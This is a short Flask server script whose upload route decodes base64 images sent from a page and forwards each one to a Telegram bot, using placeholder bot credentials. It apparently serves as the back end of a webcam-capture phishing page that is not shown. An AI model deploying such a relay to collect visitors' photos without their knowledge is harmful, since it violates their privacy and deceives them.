from flask import Flask, render_template, request
import requests
app = Flask(__name__)
@app.route('/')
def index(): return render_template('index.html')
@app.route('/upload', methods=['POST'])
def upload():
    img_data = request.json['img'].split(',')[1]
    requests.post('https://api.telegram.org/botYOUR_TOKEN/sendPhoto', data={'chat_id': 'YOUR_ID'}, files={'photo': ('img.jpg', __import__("base64").b64decode(img_data))})
    return 'ok'
if __name__ == '__main__': app.run()